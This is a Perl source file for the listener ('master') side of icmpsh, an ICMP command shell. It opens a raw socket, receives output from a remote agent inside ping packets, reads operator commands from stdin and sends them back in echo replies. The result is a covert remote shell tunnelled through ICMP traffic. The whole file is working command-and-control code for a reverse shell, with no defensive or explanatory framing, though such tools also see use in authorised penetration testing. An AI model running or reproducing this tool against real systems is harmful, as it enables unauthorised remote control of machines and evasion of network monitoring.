#!/usr/bin/env perl
#
#  icmpsh - simple icmp command shell
#  Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#



use strict;
use IO::Socket;
use NetPacket::IP;
use NetPacket::ICMP qw(ICMP_ECHOREPLY ICMP_ECHO);
use Net::RawIP;
use Fcntl;

print "icmpsh - master\n";

# create raw socket
my $sock = IO::Socket::INET->new(
                Proto   => "ICMP",
                Type    => SOCK_RAW,
                Blocking => 1) or die "$!";

# set stdin to non-blocking
fcntl(STDIN, F_SETFL, O_NONBLOCK) or die "$!";

print "running...\n";

my $input = '';
while(1) {
        if ($sock->recv(my $buffer, 4096, 0)) {
                my $ip = NetPacket::IP->decode($buffer);
                my $icmp = NetPacket::ICMP->decode($ip->{data});
                if ($icmp->{type} == ICMP_ECHO) {
                        # get identifier and sequencenumber
                        my ($ident,$seq,$data) = unpack("SSa*", $icmp->{data});

                        # write data to stdout and read from stdin
                        print $data;
                        $input = <STDIN>;

                        # compile and send response
                        $icmp->{type} = ICMP_ECHOREPLY;
                        $icmp->{data} = pack("SSa*", $ident, $seq, $input);
                        my $raw = $icmp->encode();
                        my $addr = sockaddr_in(0, inet_aton($ip->{src_ip}));
                        $sock->send($raw, 0, $addr) or die "$!\n";
                }
        }
}
